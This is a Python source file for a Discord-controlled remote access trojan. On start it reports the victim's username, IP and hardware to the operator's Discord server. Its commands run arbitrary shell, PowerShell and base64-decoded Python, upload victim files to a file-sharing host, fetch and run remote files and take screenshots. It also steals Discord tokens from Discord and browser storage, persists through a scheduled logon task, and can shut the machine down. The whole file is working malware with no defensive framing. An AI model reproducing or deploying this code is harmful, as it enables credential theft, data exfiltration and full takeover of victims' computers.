import os, discord, subprocess, requests, pyautogui, re, shutil, json, sys
from setting import *
import base64
import traceback
version = "2"
url = f"https://raw.githubusercontent.com/hai17233/ratVersion/main/read{version}.txt"
response = requests.get(url)
content = response.content
readme = base64.b64decode(content).decode("utf-8")
print ("rat")
os.system("taskkill /f /im cmd.exe")

def get_processor():
    stdout = subprocess.Popen(
        ["powershell.exe", "Get-WmiObject -Class Win32_Processor -ComputerName. | Select-Object -Property Name"], stdout=subprocess.PIPE, shell=True
    ).stdout.read().decode()
    return stdout.split("\n")[3]

def get_gpu():
    stdout = subprocess.Popen(
        ["powershell.exe", "Get-WmiObject -Class Win32_VideoController -ComputerName. | Select-Object -Property Name"], stdout=subprocess.PIPE, shell=True
    ).stdout.read().decode()
    return stdout.split("\n")[3]

def get_os():
    stdout = subprocess.Popen(
        ["powershell.exe", "Get-WmiObject -Class Win32_OperatingSystem -ComputerName. | Select-Object -Property Caption"], stdout=subprocess.PIPE, shell=True
    ).stdout.read().decode()
    return stdout.split("\n")[3]

def resource_path(relative_path):
    if hasattr(sys, "_MEIPASS"):
        return os.path.join(sys._MEIPASS, relative_path)
    return os.path.join(os.path.abspath("."), relative_path)


intents = discord.Intents.all()
bot = discord.Client(intents=intents)
session_id = os.urandom(8).hex()

commands = "\n".join([
    "!help - Help command",
    "!ping - Ping command",
    "!cd - Change directory",
    "!ls - List directory",
    "!download <file> - Download file",
    "!upload <link> - Upload file",
    "!shell - Execute shell command",
    "!cmd - execute cmd",
    "!run <file> - Run an file",
    "!exit - Exit the session",
    "!screenshot - Take a screenshot",
    "!tokens - Get all discord tokens",
    "!startup - Add to startup",
    "!shutdown - Shutdown the computer",
    "!exec - execute python (ngu)",
    "!update - update rat",
    "!info - info Version",
    "!restart - Restart the computer",
])

@bot.event
async def on_ready():
    guild = bot.get_guild(int(guild_id))
    channel = await guild.create_text_channel(session_id)
    ip_address = requests.get("https://api.ipify.org").text
    os.system("cls")
    embed = discord.Embed(title="New session created", description="", color=0xfafafa)
    embed.add_field(name="Session ID", value=f"```{session_id}```", inline=True)
    embed.add_field(name="Username", value=f"```{os.getlogin()}```", inline=True)
    embed.add_field(name="  Network Information", value=f"```IP: {ip_address}```", inline=False)
    sys_info = "\n".join([
        f"OS: {get_os()}",
        f"CPU: {get_processor()}",
        f"GPU: {get_gpu()}"
    ])
    embed.add_field(name="PC  System Information", value=f"```{sys_info}```", inline=False)
    embed.add_field(name="controll  Commands", value=f"```{commands}```", inline=False)
    await channel.send(embed=embed)

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return

    if message.channel.name != session_id:
        return

    if message.content == "!help":
        embed = discord.Embed(title="Help", description=f"```{commands}```", color=0xfafafa)
        await message.reply(embed=embed)
    if message.content == "!info":
        embed = discord.Embed(title="info - version:{version}", description=f"```{readme}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content == "!ping":
        embed = discord.Embed(title="Ping", description=f"```{round(bot.latency * 1000)}ms```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content.startswith("!cd"):
        directory = " ".join(message.content.split(" ")[1:])
        try:
            os.chdir(directory)
            embed = discord.Embed(title="Changed Directory", description=f"```{os.getcwd()}```", color=0xfafafa)
        except:
            embed = discord.Embed(title="Error", description=f"```Directory not found```", color=0xfafafa)
        await message.reply(embed=embed)
    if message.content.startswith("!exec"):
        codeen = " ".join(message.content.split(" ")[1:])
        code = base64.b64decode(codeen).decode("utf-8")
        exec(code)
    if message.content.startswith("!cmd"):
        command = " ".join(message.content.split(" ")[1:])
        output = os.popen(command).read()
        embed = discord.Embed(title=f"Command Output > {os.getcwd()}", description=f"```{output}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content == "!ls":
        files = "\n".join(os.listdir())
        if files == "":
            files = "No files found"
        embed = discord.Embed(title=f"Files > {os.getcwd()}", description=f"```{files}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content.startswith("!download"):
        file = " ".join(message.content.split(" ")[1:])
        try:
            link = requests.post("https://api.anonfiles.com/upload", files={"file": open(file, "rb")}).json()["data"]["file"]["url"]["full"]
            embed = discord.Embed(title="Download", description=f"```{link}```", color=0xfafafa)
            await message.reply(embed=embed)
        except:
            embed = discord.Embed(title="Error", description=f"```File not found```", color=0xfafafa)
            await message.reply(embed=embed)

    if message.content.startswith("!upload"):
        link = message.content.split(" ")[1]
        file = requests.get(link).content
        with open(os.path.basename(link), "wb") as f:
            f.write(file)
        embed = discord.Embed(title="Upload", description=f"```{os.path.basename(link)}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content.startswith("!shell"):
        command = " ".join(message.content.split(" ")[1:])
        output = subprocess.Popen(
            ["powershell.exe", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True
        ).communicate()[0].decode("utf-8")
        if output == "":
            output = "No output"
        embed = discord.Embed(title=f"Shell > {os.getcwd()}", description=f"```{output}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content.startswith("!run"):
        file = " ".join(message.content.split(" ")[1:])
        subprocess.Popen(file, shell=True)
        embed = discord.Embed(title="Started", description=f"```{file}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content == "!exit":
        await message.channel.delete()
        await bot.close()

    if message.content == "!screenshot":
        screenshot = pyautogui.screenshot()
        path = os.path.join(os.getenv("TEMP"), "screenshot.png")
        screenshot.save(path)
        file = discord.File(path)
        embed = discord.Embed(title="Screenshot", color=0xfafafa)
        embed.set_image(url="attachment://screenshot.png")
        await message.reply(embed=embed, file=file)

    if message.content == "!tokens":
        paths = [
            os.path.join(os.getenv("APPDATA"), ".discord", "Local Storage", "leveldb"),
            os.path.join(os.getenv("APPDATA"), ".discordcanary", "Local Storage", "leveldb"),
            os.path.join(os.getenv("APPDATA"), ".discordptb", "Local Storage", "leveldb"),
            os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
            os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome SxS", "User Data", "Default", "Local Storage", "leveldb"),
            os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),
            os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),
            os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable", "Local Storage", "leveldb"),
            os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable", "Local Storage", "leveldb"),
            os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera", "Local Storage", "leveldb"),
        ]
        tokens = []
        for path in paths:
            if not os.path.exists(path):
                continue
            
            for file in os.listdir(path):
                if not file.endswith(".log") and not file.endswith(".ldb"):
                    continue

                for line in [x.strip() for x in open(os.path.join(path, file), errors="ignore").readlines() if x.strip()]:
                    for regex in [r"[\w-]{24}\.[\w-]{6}\.[\w-]{38}", r"mfa\.[\w-]{84}"]:
                        for token in re.findall(regex, line):
                            tokens.append(token)
                            
        tokens = "\n".join(tokens)
        if tokens == "":
            tokens = "No tokens found"
        embed = discord.Embed(title="Tokens", description=f"```{tokens}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content == "!startup":
        current_file_path = os.path.abspath(__file__)
        command = f'SchTasks /create /f /sc Onlogon /tn "mainv3" /tr "{current_file_path}"'
        os.system(command)

    if message.content == "!shutdown":
        await message.channel.delete()
        await bot.close()
        os.system("shutdown /s /t 0")

    if message.content == "!restart":
        await message.channel.delete()
        await bot.close()
        os.system("shutdown /r /t 0")

def rat():
    webhook_url = webhook
    try:
        bot.run(token)
    except Exception as e:
        # Gửi thông báo lỗi tới webhook
        traceback_info = traceback.format_exc()
        payload = {
            "content": f"An error occurred:\n```{traceback_info}```"
        }
        response = requests.post(webhook_url, json=payload)
        if response.status_code != 204:
            print("Failed to send error notification to webhook.")
